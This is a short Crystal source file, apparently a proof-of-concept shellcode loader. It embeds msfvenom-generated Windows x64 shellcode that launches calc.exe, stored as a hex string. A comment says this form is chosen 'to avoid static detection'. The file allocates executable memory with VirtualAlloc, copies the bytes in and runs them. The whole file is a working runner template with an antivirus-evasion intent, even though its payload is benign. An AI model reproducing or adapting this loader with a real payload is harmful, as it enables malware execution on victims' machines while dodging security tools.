MEM_COMMIT     = 0x00001000
PAGE_EXECUTE_READWRITE = 0x40

#writing shellcode this way to avoid static detection. Bytes from msfvenom -p windows/x64/exec -f csharp  CMD=calc.exe
a = "fc 48 83 e4 f0 e8 c0 00 00 00 41 51 41 50 52 51 56 48 31 d2 65 48 8b 52 60 48 8b 52 18 48 8b 52 20 48 8b 72 50 48 0f b7 4a 4a 4d 31 c9 48 31 c0 ac 3c 61 7c 02 2c 20 41 c1 c9 0d 41 01 c1 e2 ed 52 41 51 48 8b 52 20 8b 42 3c 48 01 d0 8b 80 88 00 00 00 48 85 c0 74 67 48 01 d0 50 8b 48 18 44 8b 40 20 49 01 d0 e3 56 48 ff c9 41 8b 34 88 48 01 d6 4d 31 c9 48 31 c0 ac 41 c1 c9 0d 41 01 c1 38 e0 75 f1 4c 03 4c 24 08 45 39 d1 75 d8 58 44 8b 40 24 49 01 d0 66 41 8b 0c 48 44 8b 40 1c 49 01 d0 41 8b 04 88 48 01 d0 41 58 41 58 5e 59 5a 41 58 41 59 41 5a 48 83 ec 20 41 52 ff e0 58 41 59 5a 48 8b 12 e9 57 ff ff ff 5d 48 ba 01 00 00 00 00 00 00 00 48 8d 8d 01 01 00 00 41 ba 31 8b 6f 87 ff d5 bb f0 b5 a2 56 41 ba a6 95 bd 9d ff d5 48 83 c4 28 3c 06 7c 0a 80 fb e0 75 05 bb 47 13 72 6f 6a 00 59 41 89 da ff d5 63 61 6c 63 2e 65 78 65 00"

pAlloc = Pointer(Void).null
pAllocRet = Pointer(Void).null
pAllocSize = Pointer(UInt64).null   
pAllocSize = a.size
p! pAllocSize
puts "[*]Running VirtualAlloc"
pAllocRet = LibC.VirtualAlloc pAlloc, pAllocSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE
puts "[O]Allocated memory at: 0x#{pAllocRet.address}"
puts "[*]Running memcpy"
#converting shellcode to bytes
bytes_array = a.split.map(&.to_u8(16))
#pp bytes_array, bytes_array.class
Intrinsics.memcpy(pAllocRet, bytes_array, pAllocSize, false)
puts "[O]Wrote Bytes!"
p! pAllocRet.address
puts "[!]This is going to crash"
t = Proc(Int32).new(pAllocRet, pAllocRet)
t.call
#pThread=0;
#LibC._beginthreadex(...)